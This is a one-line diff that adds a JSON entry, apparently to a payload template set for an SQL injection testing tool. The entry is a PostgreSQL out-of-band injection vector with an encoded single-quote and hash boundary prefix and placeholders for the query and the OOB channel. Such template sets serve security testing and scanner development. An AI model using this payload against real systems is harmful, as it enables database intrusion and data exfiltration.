@@ -1,0 +1,1 @@
+{"dbms": "pgsql", "technique": "oob", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "pgsql oob: single+enc hash"}
